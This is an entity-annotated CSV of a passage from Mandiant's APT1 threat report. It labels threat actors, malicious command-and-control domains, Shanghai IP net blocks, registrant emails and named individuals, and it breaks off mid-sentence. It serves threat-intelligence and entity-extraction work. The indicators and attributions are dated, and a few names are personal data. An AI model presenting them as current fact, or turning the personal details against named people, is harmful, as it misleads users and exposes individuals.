Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 46 www.mandiant.com

Domain Name:",O
Mandiant_APT1_Report,HUGESOFT.ORG,ioc
Mandiant_APT1_Report,"
Created On:",O
Mandiant_APT1_Report,25-Oct-2004 09:46:18 UTC,timestamp
Mandiant_APT1_Report," 
Registrant Name:",O
Mandiant_APT1_Report,huge soft,identity
Mandiant_APT1_Report,"
Registrant Organization:",O
Mandiant_APT1_Report,hugesoft,identity
Mandiant_APT1_Report,"
Registrant Street1:",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"
Registrant City:",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"
Registrant State/Province:S
Registrant Postal Code:200001
Registrant Country:",O
Mandiant_APT1_Report,CN,country
Mandiant_APT1_Report,"
Registrant Phone:+86.21000021
Registrant Email:",O
Mandiant_APT1_Report,uglygorilla@163.com,identity
Mandiant_APT1_Report,"

The supplied registrant information does not need to be accurate for the zone to be registered successfully. For 
example, “",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"” is not a street name. Nevertheless, it is noteworthy that ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," appeared in the first known 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," domain registration, along with a phone number that begins with ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s “+86” international code. In fact, 
",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," was listed as the registrant’s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency 
with which other cities appeared in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," zone registration information:

taBLe 10: Locations supplied in registration data other than ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

number City state Country
7 ",O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
5 ",O
Mandiant_APT1_Report,Calgary,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report," 
4 ",O
Mandiant_APT1_Report,Guizhou,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
4 ",O
Mandiant_APT1_Report,Pasadena,city
Mandiant_APT1_Report, CA ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
4 ",O
Mandiant_APT1_Report,Houston,city
Mandiant_APT1_Report, TX ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Sydney,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Salt Lake,city
Mandiant_APT1_Report, UT ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
3 ",O
Mandiant_APT1_Report,Washington,city
Mandiant_APT1_Report,", DC ",O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Homewood,city
Mandiant_APT1_Report, AL ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Kalkaska,city
Mandiant_APT1_Report, MI ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Shallotte,city
Mandiant_APT1_Report, NC ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Yellow Spring,city
Mandiant_APT1_Report, OH ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,New York,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Provo,city
Mandiant_APT1_Report, UT ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Shenzhen,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Birmingham,city
Mandiant_APT1_Report, AL ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Scottsdale,city
Mandiant_APT1_Report, AZ ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Sunnyvale,city
Mandiant_APT1_Report, CA ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Albany,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Pearl River,city
Mandiant_APT1_Report, NY ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Chicago,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,US,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Moscow,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,Guatemala,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Nanning,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
1 ",O
Mandiant_APT1_Report,Wuhua,city
Mandiant_APT1_Report, - ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
27 Registration information blocked or not available 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 47 www.mandiant.com

Some of the supplied registration information is obviously false. For example, consider the registration information 
supplied for the zone “",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,” in ,O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,":

  ",O
Mandiant_APT1_Report,Victor,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,etejedaa@yahoo.com,ioc
Mandiant_APT1_Report," +86.8005439436
  ",O
Mandiant_APT1_Report,Michael Murphy,identity
Mandiant_APT1_Report,"
  795 Livermore St.
  Yellow Spring,Ohio,",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report," 45387

Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,. Since the ,O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report," uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning 
with “+86”. Additionally, the city name is spelled incorrectly, as it should be “",O
Mandiant_APT1_Report,Yellow Springs,city
Mandiant_APT1_Report,"” instead of “Yellow 
Spring”. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name 
incorrectly multiple times, both for the zones “",O
Mandiant_APT1_Report,uszzcs.com,ioc
Mandiant_APT1_Report,” and “,O
Mandiant_APT1_Report,attnpower.com,ioc
Mandiant_APT1_Report,"”. This suggests that the registrant 
really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in ",O
Mandiant_APT1_Report,Yellow Springs,city
Mandiant_APT1_Report,", 
Ohio. 

Overall, the combination of a relatively high number of “",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"” registrations with obviously false registration 
examples in other registrations suggests a partially uncoordinated domain registration campaign ",O
Mandiant_APT1_Report,from 2004 until present,timestamp
Mandiant_APT1_Report,", in which some registrants tried to fabricate non-",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," locations but others did not. This is supported by 
contextual information on the Internet for the email address “",O
Mandiant_APT1_Report,lfengg@163.com,ioc
Mandiant_APT1_Report,",” which was supplied in the registration 
information for seven of the 107 zones. On the site “www.",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"-one.org,” the email address “",O
Mandiant_APT1_Report,lfengg@163.com,ioc
Mandiant_APT1_Report,"” 
appears as the contact for the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,"Kai Optical Information Technology Co., Ltd.",org
Mandiant_APT1_Report,", a website production company 
located in a part of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, that is across the river from ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,". 

FIGure 25: an email address used to register ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, zones is also a contact for a ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," company



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 48 www.mandiant.com

naming themes
About half of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s known zones were named according to three themes: news, technology and business. These 
themes cause ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," command and control addresses to appear benign at first glance. However, we believe that the 
hundreds of FQDNs within these zones were created for the purpose of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intrusions. (Note: these themes are not 
unique to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, or even ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," in general.) 

The news-themed zones include the names of well-known news media outlets such as ",O
Mandiant_APT1_Report,CNN,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Reuters,org
Mandiant_APT1_Report,". 
However, they also include names referencing English-speaking countries, such as “",O
Mandiant_APT1_Report,aunewsonline.com,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report,"), 
“",O
Mandiant_APT1_Report,Canadatvsite.com,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,"), and “",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,). Below is a list of zones registered by ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," that are news-
themed:

",O
Mandiant_APT1_Report,aoldaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,aunewsonline.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Canadatvsite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,canoedaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnndaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnndaily.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnnnewsdaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,defenceonline.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,freshreaders.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,giftnews.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,issnbgkit.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,mediaxsds.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsesport.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonet.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonlinesite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newspappers.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,nytimesnews.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,oplaymagzine.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,phoenixtvus.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,purpledaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,reutersnewsonline.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,rssadvanced.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,saltlakenews.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,sportreadok.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usapappers.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usnewssite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,yahoodaily.com,ioc
Mandiant_APT1_Report,"

The technology-themed zones reference well-known technology companies (",O
Mandiant_APT1_Report,AOL,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Apple,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report,"), antivirus 
vendors (",O
Mandiant_APT1_Report,McAfee,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Symantec,org
Mandiant_APT1_Report,"), and products (",O
Mandiant_APT1_Report,Blackberry,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Bluecoat,org
Mandiant_APT1_Report,). ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," also used more generic names referencing 
topics like software:

",O
Mandiant_APT1_Report,aolon1ine.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,applesoftupdate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,blackberrycluter.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bluecoate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,comrepair.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,dnsweb.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,downloadsite.me,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,firefoxupdata.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,globalowa.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,gmailboxes.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,idirectech.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ifexcel.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infosupports.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,livemymsn.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,mcafeepaying.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,microsoft-update-info.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,micyuisyahooapis.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,msnhome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,pcclubddk.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,progammerli.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,softsolutionbox.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,symanteconline.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,webservicesupdate.com,ioc
Mandiant_APT1_Report,"

Finally, some zones used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," reflect a business theme. The names suggest websites that professionals might visit:

",O
Mandiant_APT1_Report,advanbusiness.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessconsults.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessformars.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,companyinfosite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,conferencesinfo.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,copporationnews.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,infobusinessus.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,jobsadvanced.com,ioc
Mandiant_APT1_Report,"

Not every zone stays within ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s control forever. Over a campaign lasting for so many years, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has not always 
renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, 
others have been transferred to the organizations that the domain names attempted to imitate. For example, ",O
Mandiant_APT1_Report,in September 2011,timestamp
Mandiant_APT1_Report,", Yahoo filed a complaint against “",O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,"” of “Arizona, ",O
Mandiant_APT1_Report,USA,country
Mandiant_APT1_Report,"”, who registered the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
zone “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,”.37 ,O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report, alleged the “,O
Mandiant_APT1_Report,<,O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report," > domain name was confusingly similar to 
Complainant’s ",O
Mandiant_APT1_Report,YAHOO!,org
Mandiant_APT1_Report, mark” and that “[,O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,] registered and used the ,O
Mandiant_APT1_Report,<,O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report," > domain name 
in bad faith.” In response, the National Arbitration Forum found that the site “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"” at the time resolved 

37  ",O
Mandiant_APT1_Report,Yahoo! Inc.,org
Mandiant_APT1_Report," v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (",O
Mandiant_APT1_Report,"October 31, 2011",timestamp
Mandiant_APT1_Report,) (T,O
Mandiant_APT1_Report,"yrus R. Atkinson, Jr.",identity
Mandiant_APT1_Report,", panelist), http://
domains.adrforum.com/domains/decisions/1409001.htm, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 49 www.mandiant.com

to “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials 
under false pretenses.” Not surprisingly, “",O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,"” did not respond. Subsequently, control of “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,” was transferred from ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, to ,O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report,".

third-Party services
The third-party service that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used the most is known as “dynamic DNS.” This is a service that allows people 
to register subdomains under zones that other people have registered and provided to the service. Over the years, 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they 
simply log in to these services and update the IP resolution of their FQDN via a web-based interface.

In addition to dynamic DNS, recently we have observed that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has been creating FQDNs that end with  
“",O
Mandiant_APT1_Report,appspot.com,ioc
Mandiant_APT1_Report,"”, suggesting that they are using ",O
Mandiant_APT1_Report,Google’s App Engine,software
Mandiant_APT1_Report," service.

hijacked FQDns
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We 
consider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have 
been leveraged by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, for malicious purposes. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses hijacked FQDNs for two main purposes. First, they 
place malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing 
emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their 
backdoors. 

EVIDENCE OF A VAST INFRASTRUCTURE

As noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP 
addresses, with the majority of IP addresses registered to organizations in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709), followed by the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," (109). 
In the last three years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs resolving to 988 unique IP addresses that we believe are not 
“sinkhole”38 or “domain parking”39 IP addresses:

»» ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,": 559

»» ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,": 263

»» ",O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report,": 25

»» ",O
Mandiant_APT1_Report,Korea,country
Mandiant_APT1_Report,": 22

»» ",O
Mandiant_APT1_Report,United Kingdom,country
Mandiant_APT1_Report,": 14

»» ",O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,": 12

»» Other: 83

38  A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to 
sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.
39  Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when 
the zone expires. These IP addresses usually host advertisements.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 50 www.mandiant.com

The vast majority of the Chinese IP addresses again belong to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s home networks, meaning that in some instances 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders probably communicated directly to victim systems from their ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," systems, bypassing their hop 
infrastructure:

taBLe 11: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDns have resolved to IP addresses within these Chinese net blocks 

number net block registered owner

150 ",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

68 ",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

10 ",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

7 ",O
Mandiant_APT1_Report,114.80.0.0 - 114.95.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

5 ",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

4 ",O
Mandiant_APT1_Report,222.64.0.0 - 222.73.255.25,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

3 ",O
Mandiant_APT1_Report,116.224.0.0 – 116.239.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

16 Other (Non-",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,")

These statistics indicate that there are over 400 IP addresses in the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, alone that may have active ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers, 
which are as-yet unconfirmed by ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,". Additionally, although we know of over 2,500 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs, there are 
many ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, FQDNs that we have not attributed to ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,", which have resolved to even more IP addresses. We estimate 
(conservatively) that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s current hop infrastructure includes over 1,000 servers. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 51 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": IDentItIes

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the 
",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, behind ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s keyboards, we have decided to expose the identities of a select number of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," personas. These 
actors have made poor operational security choices, facilitating our research and allowing us to track their activities. 
They are some of the authors of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s digital weapons and the registrants of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs and email accounts. These 
actors have expressed interest in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s cyber warfare efforts, disclosed their locations to be the Pudong New Area 
of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", and have even used a ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," mobile phone number to register email accounts used in spear phishing 
campaigns.

Methods for attributing ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," personnel often involve the synthesis of many small pieces of information into a singular 
comprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets 
of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as 
“personas.” As ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs), 
they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops, 
FQDNs, ",O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report," tools (e.g., malware) and ports.

One additional element working in our favor as threat trackers is the Great Firewall of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (GFWoC). Like many 
Chinese hackers, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, attackers do not like to be constrained by the strict rules put in place by ,O
Mandiant_APT1_Report,the Communist Party,org
Mandiant_APT1_Report," 
of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,"), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.
com, facebook.com, and twitter.com. Additionally, the nature of the hackers’ work requires them to have control of 
network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into ",O
Mandiant_APT1_Report,Facebook,org
Mandiant_APT1_Report," 
and ",O
Mandiant_APT1_Report,Twitter,org
Mandiant_APT1_Report," is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real 
identities.

what is the Great Firewall of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"?
The “Great Firewall” is a term used to describe the various technical methods used by the 
",O
Mandiant_APT1_Report,Chinese government,org
Mandiant_APT1_Report," to censor and block or restrict access to Internet services and content 
that the government considers sensitive or inappropriate. “Inappropriate” content ranges 
from pornography to political dissent, and from social media to news sites that may portray 

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," or Chinese officials in a negative light. The “Great Firewall” uses methods such as blocking particular 
IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target 
keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese 
websites, blogs, and social media for “inappropriate” content, removing it when found. As a result, Chinese 
citizens who wish to access censored content must resort to workarounds such as the use of encryption. 
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," continues to improve and further restrict Internet access, most recently (in ",O
Mandiant_APT1_Report,December 2012,timestamp
